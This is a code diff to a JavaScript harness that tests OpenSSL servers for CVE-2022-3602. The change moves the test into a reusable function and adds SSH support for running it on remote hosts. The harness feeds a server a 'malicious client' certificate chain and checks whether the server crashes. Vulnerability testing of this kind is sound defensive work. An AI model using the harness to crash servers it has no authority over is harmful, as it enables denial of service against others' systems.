@@ -2,6 +2,41 @@ import { execFile } from "node:child_process";
 import { promisify } from "node:util";
 
 /**
+ * @typedef {object} SSHOpts SSH options.
+ * @property {string} username - The username to use.
+ * @property {string} host - The host of the SSH server.
+ * @property {string} port - The port the SSH server is listening on.
+ */
+
+/**
+ * Runs the given command through SSH.
+ *
+ * @param {string[]} command - The command to run on the remote host.
+ * @param {SSHOpts} opts - The SSH connection options.
+ * @param {import("node:child_process").ExecFileOptionsWithStringEncoding} [childProcessOpts] - Options to pass to execFile().
+ * @returns {import("node:child_process").PromiseWithChild<{stdout: string, stderr: string}>}
+ * The SSH process.
+ */
+function runViaSSH(command, { username, host, port }, childProcessOpts) {
+  return promisify(execFile)(
+    "ssh",
+    [
+      "-o",
+      "ControlMaster=yes",
+      "-o",
+      "ControlPath=%d/.ssh/controlmasters/%r@%h:%p",
+      "-o",
+      "ControlMaster=auto",
+      "-o",
+      "ControlPersist=60m", // keep control socket open for 60m for faster SSH
+      `ssh://${username}@${host}:${port}`,
+      ...command,
+    ],
+    childProcessOpts
+  );
+}
+
+/**
  * @typedef {object} RunLogs Result from a {@link OpenSSLTestCase} run.
  * @property {object} client - OpenSSL client logs.
  * @property {string} client.stdout - OpenSSL client stdout output.
@@ -11,6 +46,141 @@ import { promisify } from "node:util";
  * @property {string} server.stderr - OpenSSL server stderr output.
  * @property {import("node:child_process").ChildProcess["exitCode"]} server.exitCode - If set, the exit code of the process.
  */
+
+/**
+ * Runs an OpenSSL test case.
+ *
+ * @param {object} [opts] - Optional options.
+ * @param {string} [opts.opensslBinary] - The openssl CLI binary to use.
+ * @param {SSHOpts} [opts.sshOpts] - If set, SSH to the given host, and run the
+ * test there.
+ * @param {number} [opts.port] - The port to use for the OpenSSL test.
+ * @param {number} [opts.timeout] - The number of milliseconds, after which,
+ * if there has been no error, assume that the OpenSSL server code is not
+ * vulnerable to CVE-2022-3602.
+ * @returns {Promise<RunLogs>} Resolves when the processes are closed with the logs of the process.
+ */
+async function runTest({
+  opensslBinary = "openssl",
+  sshOpts = null,
+  port = 31050,
+  timeout = 10_000,
+} = {}) {
+  /**
+   * @type {(
+   *   cmd: string[],
+   *   opts: import("node:child_process").ExecFileOptionsWithStringEncoding,
+   * ) => import("node:child_process").PromiseWithChild<{stdout: string, stderr: string}>}
+   * Runs the given command, either via SSH or on the local machine.
+   */
+  let execFileFunc;
+  if (sshOpts) {
+    execFileFunc = (command, opts) => runViaSSH(command, sshOpts, opts);
+  } else {
+    execFileFunc = (command, opts) =>
+      promisify(execFile)(command[0], command.slice(1), opts);
+  }
+
+  const abortController = new AbortController();
+  try {
+    console.info(`Running OpenSSL server on port ${port}`);
+
+    const serverProcess = execFileFunc(
+      [
+        opensslBinary,
+        "s_server",
+        "-accept",
+        port,
+        "-CAfile",
+        "certs/cacert.pem",
+        "-cert",
+        "certs/server.cert.pem",
+        "-key",
+        "certs/server.key.pem",
+        "-state",
+        "-verify",
+        1,
+      ],
+      {
+        signal: abortController.signal,
+      }
+    );
+
+    // wait for OpenSSL server to start listening
+    await Promise.race([promisify(setTimeout)(2000), serverProcess]);
+
+    console.info(`Running OpenSSL malicious client payload on port ${port}`);
+
+    const clientProcess = execFileFunc([
+      opensslBinary,
+      "s_client",
+      "-connect",
+      `127.0.0.1:${port}`,
+      "-key",
+      "certs/client.key.pem",
+      "-cert",
+      "certs/client.cert.pem",
+      "-CAfile",
+      "certs/malicious-client-cacert.pem",
+      "-state",
+    ]);
+
+    await Promise.race([
+      promisify(setTimeout)(timeout),
+      serverProcess,
+      clientProcess,
+    ]);
+
+    console.info(
+      `Both server and client are alive after ${timeout}ms, server is not vulnerable to CVE-2022-3602!`
+    );
+
+    console.info("Killing client with SIGINT (CTRL+C)");
+    clientProcess.child.kill("SIGINT");
+    serverProcess.child.kill("SIGINT");
+
+    let clientOutput;
+    try {
+      clientOutput = await clientProcess;
+    } catch (error) {
+      if (error.signal !== "SIGINT") {
+        throw error;
+      }
+
+      clientOutput = {
+        stdout: error.stdout,
+        stderr: error.stderr,
+      };
+    }
+
+    let serverOutput;
+    try {
+      serverOutput = await serverProcess;
+    } catch (error) {
+      if (error.signal !== "SIGINT") {
+        throw error;
+      }
+
+      serverOutput = {
+        stdout: error.stdout,
+        stderr: error.stderr,
+      };
+    }
+
+    return /** @type {RunLogs} */ ({
+      client: clientOutput,
+      server: {
+        ...serverOutput,
+        exitCode: serverProcess.child.exitCode || 0x82 /* Killed by SIGINT */,
+      },
+    });
+  } catch (error) {
+    abortController.abort(error);
+    throw error;
+  } finally {
+    abortController.abort(new Error("THIS SHOULD NEVER HAPPEN!!!!"));
+  }
+}
 
 /**
  * Generic test case for testing/exploiting [OpenSSL's CVE-2022-3602][1].
@@ -38,108 +208,8 @@ export class LocalHostTestCase extends OpenSSLTestCase {
    * @inheritdoc
    */
   static async run() {
-    const port = 31050;
-
-    const timeout = 10_000;
-
-    const abortController = new AbortController();
-    try {
-      console.info(`Running OpenSSL server on port ${port}`);
-
-      const serverProcess = promisify(execFile)(
-        "openssl",
-        [
-          "s_server",
-          "-accept",
-          port,
-          "-CAfile",
-          "certs/cacert.pem",
-          "-cert",
-          "certs/server.cert.pem",
-          "-key",
-          "certs/server.key.pem",
-          "-state",
-          "-verify",
-          1,
-        ],
-        {
-          signal: abortController.signal,
-        }
-      );
-
-      // wait for OpenSSL server to start listening
-      await Promise.race([promisify(setTimeout)(2000), serverProcess]);
-
-      console.info(`Running OpenSSL malicious client payload on port ${port}`);
-
-      const clientProcess = promisify(execFile)("openssl", [
-        "s_client",
-        "-connect",
-        `127.0.0.1:${port}`,
-        "-key",
-        "certs/client.key.pem",
-        "-cert",
-        "certs/client.cert.pem",
-        "-CAfile",
-        "certs/malicious-client-cacert.pem",
-        "-state",
-      ]);
-
-      await Promise.race([
-        promisify(setTimeout)(timeout),
-        serverProcess,
-        clientProcess,
-      ]);
-
-      console.info(
-        `Both server and client are alive after ${timeout}ms, server is not vulnerable to CVE-2022-3602!`
-      );
-
-      console.info("Killing client with SIGINT (CTRL+C)");
-      clientProcess.child.kill("SIGINT");
-      serverProcess.child.kill("SIGINT");
-
-      let clientOutput;
-      try {
-        clientOutput = await clientProcess;
-      } catch (error) {
-        if (error.signal !== "SIGINT") {
-          throw error;
-        }
-
-        clientOutput = {
-          stdout: error.stdout,
-          stderr: error.stderr,
-        };
-      }
-
-      let serverOutput;
-      try {
-        serverOutput = await serverProcess;
-      } catch (error) {
-        if (error.signal !== "SIGINT") {
-          throw error;
-        }
-
-        serverOutput = {
-          stdout: error.stdout,
-          stderr: error.stderr,
-        };
-      }
-
-      return /** @type {RunLogs} */ ({
-        client: clientOutput,
-        server: {
-          ...serverOutput,
-          exitCode: serverProcess.child.exitCode || 0x82 /* Killed by SIGINT */,
-        },
-      });
-    } catch (error) {
-      abortController.abort(error);
-      throw error;
-    } finally {
-      abortController.abort(new Error("THIS SHOULD NEVER HAPPEN!!!!"));
-    }
+    // runs tests with default options on localhost
+    return await runTest({ sshOpts: null });
   }
 }
 
